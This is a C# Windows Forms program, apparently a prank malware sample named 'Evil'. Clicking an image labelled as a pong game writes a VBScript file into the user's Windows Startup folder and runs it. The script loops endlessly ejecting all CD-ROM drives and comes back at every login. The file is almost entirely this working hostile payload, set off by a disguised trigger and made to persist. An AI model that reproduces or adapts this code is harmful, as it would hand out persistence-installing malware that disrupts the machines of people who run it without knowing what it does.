using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

namespace C_Sharp_Evil
{
    public partial class Evil : Form
    {
        //C:\Users\Kurtis\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
        string CDVBSPath = @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\";
        string[] CDVBSArr = { //if a string array & .WriteAllLines are used, each string is its own line
                                          "do",
                                          "Dim ts",
                                          "Dim strDriveLetter",
                                          "Dim intDriveLetter",
                                          "Dim fs 'As Scripting.FileSystemObject",
                                          "Const CDROM = 4",
                                          "On Error Resume Next",
                                          "Set fs = CreateObject(\"Scripting.FileSystemObject\")",
                                          "strDriveLetter = \"\"",
                                          "For intDriveLetter = Asc(\"A\") To Asc(\"Z\")",
                                          "Err.Clear",
                                          "If fs.GetDrive(Chr(intDriveLetter)).DriveType = CDROM Then",
                                          "If Err.Number = 0 Then",
                                          "strDriveLetter = Chr(intDriveLetter)",
                                          "Exit For",
                                          "End If",
                                          "End If",
                                          "Next",
                                          "Set oWMP = CreateObject(\"WMPlayer.OCX.7\" )",
                                          "Set colCDROMs = oWMP.cdromCollection",
                                          "For d = 0 to colCDROMs.Count - 1",
                                          "colCDROMs.Item(d).Eject",
                                          "Next 'null",
                                          "",
                                          "For d = 0 to colCDROMs.Count - 1",
                                          "colCDROMs.Item(d).Eject",
                                          "Next 'null",
                                          "",
                                          "set owmp = nothing",
                                          "set colCDROMs = nothing",
                                          "loop"
                                      };

        public Evil()
        {
            InitializeComponent();
        }

        private void picPong_Click(object sender, EventArgs e)
        {
            writeFile(CDVBSArr, CDVBSPath, @"CD.vbs");
            Application.Exit();
        }

        private void writeFile(string[] toWrite, string Spath, string filename)
        {
            string path = Spath + filename;

            if (File.Exists(path)) //if the temp file already exists, delete it
            {
                File.Delete(path);
            }
            using (FileStream fs = File.Create(path, 1024)) { } //create the file
            System.IO.File.WriteAllLines(path, toWrite); //write to the file
            Process.Start(path);
        }
    }
}
